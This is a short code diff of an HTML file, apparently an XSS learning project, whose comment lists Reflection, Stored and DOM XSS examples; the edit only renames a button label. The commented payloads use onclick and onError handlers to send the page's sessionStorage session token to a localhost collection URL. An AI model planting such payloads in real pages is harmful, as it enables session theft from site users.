@@ -20,7 +20,7 @@
 
   <!--
     Reflection XSS
-    <button onclick="document.location.replace('http://www.localhost:5000/sessionId:' + sessionStorage.getItem('session'))">asdasd</button>
+    <button onclick="document.location.replace('http://www.localhost:5000/sessionId:' + sessionStorage.getItem('session'))">click me</button>
     Stored XSS
     <img src="x" onError="document.location.replace('http://www.localhost:5000/sessionId:' + sessionStorage.getItem('session'))"/>
     DOM XSS
